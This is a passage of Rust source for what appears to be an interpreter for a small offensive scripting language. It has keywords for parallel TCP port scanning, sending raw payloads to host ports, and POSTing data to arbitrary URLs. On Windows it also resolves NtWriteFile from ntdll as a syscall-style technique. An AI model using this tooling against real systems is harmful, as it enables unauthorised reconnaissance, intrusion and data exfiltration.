        };

        let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos() as i64;

        Value::Int(BigInt::from(start + (seed % (end - start + 1).max(1))))
    }

    fn parse_log(&mut self) {
        self.expect_keyword("log");
        let val = match self.parse_cond() {
            Value::Int(n) => n.to_string(),                  
            Value::Float(f) => f.to_string(),                
            Value::Str(s) => s, 
            Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), 
            Value::Dict(d) => format!("{:?}", d), 
            Value::Gateway { .. } => "[Raw Ring-0 Gateway Object]".to_string(), 
            Value::TimeAnchor(_) => "[Temporal Anchor]".to_string(),
            Value::CycleAnchor(_) => "[Hardware Cycle Anchor]".to_string(),
            Value::L7Tunnel { .. } => "[Layer 7 TCP Tunnel]".to_string(),
            Value::None => "None".to_string(),
        };
        println!("{}", val);
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
    }

    fn parse_cond(&mut self) -> Value {
        let left = self.parse_expr();
        if let Some(Token::Compare(op)) = self.peek() {
            self.next();
            let right = self.parse_expr();
            match (&left, &right) {
                (Value::Int(l), Value::Int(r)) => {
                    let res = match op.as_str() {
                        "==" => l == r,
                        "!=" => l != r,
                        ">" => l > r,
                        "<" => l < r,
                        ">=" => l >= r,
                        "<=" => l <= r,
                        _ => false,
                    };
                    return Value::Bool(res);
                }

                (Value::Float(l), Value::Float(r)) => {
                    let res = match op.as_str() {
                        "==" => l == r,
                        "!=" => l != r,
                        ">" => l > r,
                        "<" => l < r,
                        ">=" => l >= r,
                        "<=" => l <= r,
                        _ => false,
                    };
                    return Value::Bool(res);
                }

                (Value::Int(l), Value::Float(r)) => {
                    let lf = l.to_string().parse::<f64>().unwrap();
                    let res = match op.as_str() {
                        "==" => lf == *r,
                        "!=" => lf != *r,
                        ">" => lf > *r,
                        "<" => lf < *r,
                        ">=" => lf >= *r,
                        "<=" => lf <= *r,
                        _ => false,
                    };
                    return Value::Bool(res);
                }

                (Value::Float(l), Value::Int(r)) => {
                    let rf = r.to_string().parse::<f64>().unwrap();
                    let res = match op.as_str() {
                        "==" => *l == rf,
                        "!=" => *l != rf,
                        ">" => *l > rf,
                        "<" => *l < rf,
                        ">=" => *l >= rf,
                        "<=" => *l <= rf,
                        _ => false,
                    };
                    return Value::Bool(res);
                }

                _ => {}
            }
            if let (Value::Str(l), Value::Str(r)) = (&left, &right) {
                let res = match op.as_str() {
                    "==" => l == r,
                    "!=" => l != r,
                    _ => false,
                };
                return Value::Bool(res);
            }
        }
        left
    }

    fn parse_standard_if(&mut self) {
        self.expect_keyword("if");
        let cond = match self.parse_cond() {
            Value::Bool(b) => b,
            Value::Int(n) => n != BigInt::zero(),
            Value::Float(n) => n != 0.0,
            _ => false,
        };
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        let mut temp_pos = self.pos;
        let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) {
                    depth += 1;
                }
                if k == "end" {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
            }
            temp_pos += 1;
        }
        let end_of_if = temp_pos;
        if cond {
            while self.pos < end_of_if {
                self.parse_stmt();
                if self.has_break {
                    break;
                }
            }
        }
        self.pos = end_of_if + 1;
    }

    fn parse_while(&mut self) {
        self.expect_keyword("while");
        let cond_start = self.pos;
        let mut temp_pos = self.pos;
        while
            temp_pos < self.tokens.len() &&
            self.tokens[temp_pos] != Token::Punctuation(":".to_string())
        {
            temp_pos += 1;
        }
        temp_pos += 1;
        let mut depth = 1;
        while temp_pos < self.tokens.len() {
            if let Token::Keyword(ref k) = self.tokens[temp_pos] {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) {
                    depth += 1;
                }
                if k == "end" {
                    depth -= 1;
                    if depth == 0 {
                        break;
                    }
                }
            }
            temp_pos += 1;
        }
        let end_of_while = temp_pos;
        loop {
            self.pos = cond_start;
            self.has_break = false;
            if let Value::Bool(b) = self.parse_cond() {
                if let Some(Token::Punctuation(ref p)) = self.peek() {
                    if p == ":" {
                        self.next();
                    }
                }
                if !b {
                    self.pos = end_of_while + 1;
                    break;
                }
                while self.pos < end_of_while {
                    self.parse_stmt();
                    if self.has_break {
                        break;
                    }
                }
                if self.has_break {
                    self.has_break = false;
                    self.pos = end_of_while + 1;
                    break;
                }
            } else {
                self.pos = end_of_while + 1;
                break;
            }
        }
    }

    fn parse_expr(&mut self) -> Value {
        let mut res = self.parse_term();

        while let Some(Token::Operator(op)) = self.peek() {
            if op == "+" || op == "-" {
                self.next();
                let right = self.parse_term();

                match (&res, &right) {
                    (Value::Int(l), Value::Int(r)) => {
                        res = if op == "+" { Value::Int(l + r) } else { Value::Int(l - r) };
                    }

                    (Value::Float(l), Value::Float(r)) => {
                        res = if op == "+" { Value::Float(l + r) } else { Value::Float(l - r) };
                    }

                    (Value::Int(l), Value::Float(r)) => {
                        let lf = l.to_string().parse::<f64>().unwrap();
                        res = if op == "+" { Value::Float(lf + r) } else { Value::Float(lf - r) };
                    }

                    (Value::Float(l), Value::Int(r)) => {
                        let rf = r.to_string().parse::<f64>().unwrap();
                        res = if op == "+" { Value::Float(l + rf) } else { Value::Float(l - rf) };
                    }

                    (Value::Str(l), Value::Str(r)) if op == "+" => {
                        res = Value::Str(format!("{}{}", l, r));
                    }

                    _ => panic!("Bad arithmetic types"),
                }
            } else {
                break;
            }
        }

        res
    }

    fn parse_term(&mut self) -> Value {
        let mut res = self.parse_factor();

        while let Some(Token::Operator(op)) = self.peek() {
            if op == "*" || op == "/" || op == "%" {
                self.next();
                let right = self.parse_factor();

                match (&res, &right) {
                    // Int + Int math
                    (Value::Int(l), Value::Int(r)) => {
                        res = match op.as_str() {
                            "*" => Value::Int(l * r),

                            "/" => {
                                let lf = l.to_string().parse::<f64>().unwrap();
                                let rf = r.to_string().parse::<f64>().unwrap();
                                Value::Float(lf / rf)
                            }

                            "%" => Value::Int(l % r),

                            _ => unreachable!(),
                        };
                    }

                    // Float + Float math
                    (Value::Float(l), Value::Float(r)) => {
                        res = match op.as_str() {
                            "*" => Value::Float(l * r),
                            "/" => Value::Float(l / r),
                            "%" => Value::Float(l % r),
                            _ => unreachable!(),
                        };
                    }

                    // Int + Float
                    (Value::Int(l), Value::Float(r)) => {
                        let lf = l.to_string().parse::<f64>().unwrap();

                        res = match op.as_str() {
                            "*" => Value::Float(lf * r),
                            "/" => Value::Float(lf / r),
                            "%" => Value::Float(lf % r),
                            _ => unreachable!(),
                        };
                    }

                    // Float + Int
                    (Value::Float(l), Value::Int(r)) => {
                        let rf = r.to_string().parse::<f64>().unwrap();

                        res = match op.as_str() {
                            "*" => Value::Float(l * rf),
                            "/" => Value::Float(l / rf),
                            "%" => Value::Float(l % rf),
                            _ => unreachable!(),
                        };
                    }

                    _ => panic!("Bad term types"),
                }
            } else {
                break;
            }
        }

        res
    }

    fn parse_scan(&mut self) {
        self.expect_keyword("scan");
        let t = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        let ip = match self.memory.get(&t) {
            Some(Value::Str(s)) => s.clone(),
            _ => panic!(),
        };
        let port = match self.memory.get("port") {
            Some(Value::Int(p)) => p.to_string().parse::<u16>().unwrap_or(80),
            Some(Value::Float(p)) => *p as u16,
            _ => 80,
        };
        let addr = format_address(&ip, port);
        let open = if let Ok(s_addr) = addr.to_socket_addrs() {
            if let Some(a) = s_addr.into_iter().next() {
                TcpStream::connect_timeout(&a, Duration::from_millis(500)).is_ok()
            } else {
                false
            }
        } else {
            false
        };
        self.parse_if(open);
    }

    fn parse_swarm(&mut self) {
        self.expect_keyword("swarm");
        let t = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        self.expect_keyword("ports");
        let s_port = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<u16>().unwrap_or(0),
            Value::Float(n) => n as u16,
            _ => 0,
        };

        self.expect_keyword("to");

        let e_port = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<u16>().unwrap_or(0),
            Value::Float(n) => n as u16,
            _ => 0,
        };
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        let mut body = Vec::new();
        let mut d = 1;
        while let Some(tok) = self.peek() {
            self.next();
            if let Token::Keyword(ref k) = tok {
                if ["if", "for", "while", "swarm", "scan", "fn", "op", "try"].contains(&k.as_str()) {
                    d += 1;
                }
                if k == "end" {
                    d -= 1;
                    if d == 0 {
                        break;
                    }
                }
            }
            body.push(tok);
        }
        let ip = match self.memory.get(&t) {
            Some(Value::Str(s)) => s.clone(),
            _ => panic!(),
        };
        let (mem, fns) = (self.memory.clone(), self.functions.clone());
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            let mut ts = vec![];
            for port in s_port..=e_port {
                let (ip_c, sub_c, mut mem_c, fns_c) = (
                    ip.clone(),
                    body.clone(),
                    mem.clone(),
                    fns.clone(),
                );
                ts.push(
                    tokio::task::spawn_blocking(move || {
                        let addr = format_address(&ip_c, port);
                        let open = if let Ok(mut resolved) = addr.to_socket_addrs() {
                            if let Some(a) = resolved.next() {
                                TcpStream::connect_timeout(&a, Duration::from_millis(400)).is_ok()
                            } else {
                                false
                            }
                        } else {
                            false
                        };
                        mem_c.insert("port".to_string(), Value::Int(BigInt::from(port)));
                        let mut p = Parser::new(sub_c);
                        p.memory = mem_c;
                        p.functions = fns_c;
                        p.parse_if(open);
                    })
                );
            }
            for t in ts {
                let _ = t.await;
            }
        });
    }

    #[allow(dead_code)]
    fn run_swarm(&mut self, is_open: bool) {
        while self.pos < self.tokens.len() {
            if let Some(Token::Keyword(ref k)) = self.peek() {
                if k == "if" {
                    self.parse_if(is_open);
                } else {
                    self.parse_stmt();
                }
            } else {
                self.next();
            }
        }
    }

    fn parse_payload(&mut self) {
        self.expect_keyword("payload");
        let t_id = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        let p_id = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else if let Some(Token::NumberInt(n)) = self.peek() {
            self.next();
            n.to_string()
        } else {
            panic!();
        };
        let raw = if let Some(Token::StringLiteral(s)) = self.peek() {
            self.next();
            s
        } else {
            panic!();
        };
        let ip = match self.memory.get(&t_id) {
            Some(Value::Str(s)) => s.clone(),
            _ => t_id,
        };
        let port = match self.memory.get(&p_id) {
            Some(Value::Int(n)) => n.to_string().parse::<u16>().unwrap_or(80),
            _ => p_id.parse().unwrap_or(80),
        };
        let addr = format_address(&ip, port);
        if let Ok(mut addrs) = addr.to_socket_addrs() {
            if let Some(a) = addrs.next() {
                if let Ok(mut s) = TcpStream::connect_timeout(&a, Duration::from_secs(1)) {
                    let _ = s.write_all(raw.replace("\\n", "\n").replace("\\r", "\r").as_bytes());
                    let mut b = [0; 4096];
                    if let Ok(n) = s.read(&mut b) {
                        if n > 0 {
                            println!("{}", String::from_utf8_lossy(&b[..n]).trim());
                        }
                    }
                }
            }
        }
    }

    fn parse_transmit(&mut self) -> Value {
        self.expect_keyword("transmit");

        let url_val = self.parse_factor();
        let payload_val = self.parse_factor();

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }

        let url = match url_val {
            Value::Str(s) => s,
            _ => panic!("URL must be string"),
        };

        let payload = match payload_val {
            Value::Str(s) => s,
            Value::Int(n) => n.to_string(),
            Value::Float(n) => n.to_string(),
            Value::Bool(b) => b.to_string(),
            _ => "".to_string(),
        };

        if
            let Ok(client) = reqwest::blocking::Client
                ::builder()
                .timeout(Duration::from_secs(5))
                .build()
        {
            match client.post(&url).body(payload).send() {
                Ok(resp) => {
                    let text = resp.text().unwrap_or_default();
                    return Value::Str(text);
                }
                Err(_) => {
                    return Value::Str("".to_string());
                }
            }
        }

        Value::Str("".to_string())
    }

    fn parse_file_op(&mut self, is_append: bool) {
        self.next();
        let filepath = if let Value::Str(s) = self.parse_factor() {
            s
        } else {
            panic!();
        };
        let content = match self.parse_factor() { 
            Value::Int(n) => n.to_string(),                  
            Value::Float(f) => f.to_string(),              
            Value::Str(s) => s, 
            Value::Bool(b) => b.to_string(), 
            Value::List(l) => format!("{:?}", l), 
            Value::Dict(d) => format!("{:?}", d), 
            Value::Gateway{..} => "gateway".to_string(), 
            Value::TimeAnchor(_) => "[Temporal Anchor]".to_string(),
            Value::CycleAnchor(_) => "[Hardware Cycle Anchor]".to_string(),
            Value::L7Tunnel { .. } => "[Layer 7 TCP Tunnel]".to_string(),
            Value::None => "None".to_string()
        };
        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }
        #[cfg(target_os = "windows")]
        unsafe {
            println!("\nInitiating syscall resolution for file I/O...");
            let ntdll_handle = GetModuleHandleA(CString::new("ntdll.dll").unwrap().as_ptr());
            let func_address = GetProcAddress(
                ntdll_handle,
                CString::new("NtWriteFile").unwrap().as_ptr()
            );
        }
        let mut opt = OpenOptions::new();
        opt.write(true).create(true);
        if is_append {
            opt.append(true);
        } else {
            opt.truncate(true);
        }
        if let Ok(mut f) = opt.open(&filepath) {
            let _ = writeln!(f, "{}", content);
        }
    }

    fn parse_if(&mut self, cond: bool) {
        self.expect_keyword("if");
        self.next();
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        if cond {
            while let Some(t) = self.peek() {
                if let Token::Keyword(ref k) = t {
                    if k == "end" {
                        break;
                    }
                }
                self.parse_stmt();
            }
            if let Some(Token::Keyword(ref k)) = self.peek() {
                if k == "end" {
                    self.next();
                }
            }
        } else {
            self.skip_block();
        }
    }

    fn skip_block(&mut self) {
        let mut d = 1;
        while d > 0 {
            if let Some(Token::Keyword(ref k)) = self.peek() {
                if ["if", "swarm", "scan", "while", "for", "op", "fn", "try"].contains(&k.as_str()) {
                    d += 1;
                }
                if k == "end" {
                    d -= 1;
                }
            }
            if d == 0 {
                break;
            }
            self.next();
        }
        self.next();
    }

    fn parse_for(&mut self) {
        self.expect_keyword("for");
        let iter = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };
        self.expect_keyword("in");
        let mut items = Vec::new();
        match self.peek() {
            Some(Token::StringLiteral(f)) => {
                self.next();
                items = fs
                    ::read_to_string(f)
                    .unwrap_or_default()
                    .lines()
                    .map(|l| Value::Str(l.to_string()))
                    .collect();
            }
            Some(Token::Identifier(l)) => {
                self.next();
                if let Some(Value::List(lst)) = self.memory.get(&l) {
                    items = lst.clone();
                }
            }
            _ => panic!(),
        }
        if let Some(Token::Punctuation(ref p)) = self.peek() {
            if p == ":" {
                self.next();
            }
        }
        let start = self.pos;
        for item in items {
            self.memory.insert(iter.clone(), item);
            self.pos = start;
            while let Some(t) = self.peek() {
                if let Token::Keyword(ref k) = t {
                    if k == "end" {
                        break;
                    }
                }
                self.parse_stmt();
            }
        }
        self.pos = start;
        self.skip_block();
    }

    fn parse_wait(&mut self) {
        self.expect_keyword("wait");

        let ms = match self.parse_factor() {
            Value::Int(n) => n.to_string().parse::<u64>().unwrap_or(0),
            Value::Float(n) => n as u64,
            _ => 0,
        };

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }

        thread::sleep(Duration::from_millis(ms));
    }

    fn parse_push(&mut self) {
        self.expect_keyword("push");

        let name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };

        let val = self.parse_factor();

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }

        if let Some(Value::List(l)) = self.memory.get_mut(&name) {
            l.push(val);
        }
    }

    fn parse_pop(&mut self) {
        self.expect_keyword("pop");

        let name = if let Some(Token::Identifier(id)) = self.peek() {
            self.next();
            id
        } else {
            panic!();
        };

        if let Some(Token::Delimiter) = self.peek() {
            self.next();
        }

        if let Some(Value::List(l)) = self.memory.get_mut(&name) {
            l.pop();
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        println!("Error: Missing input file. Usage: cargo run -- <file.brc>");
        return;
    }
    let filename = &args[1];
    if !filename.ends_with(".brc") {
        println!("Error: Invalid file type. Please provide a .brc file.");
        std::process::exit(1);
    }
    let raw_code = fs::read_to_string(filename).unwrap_or_else(|_| {
        println!("Error: Unable to read input file.");
        std::process::exit(1);
    });
    let raw_tokens = lexer(&raw_code);
    let mutated_tokens = mutate_token_stream(raw_tokens);
    let mut execution_engine = Parser::new(mutated_tokens);
    execution_engine.parse();
}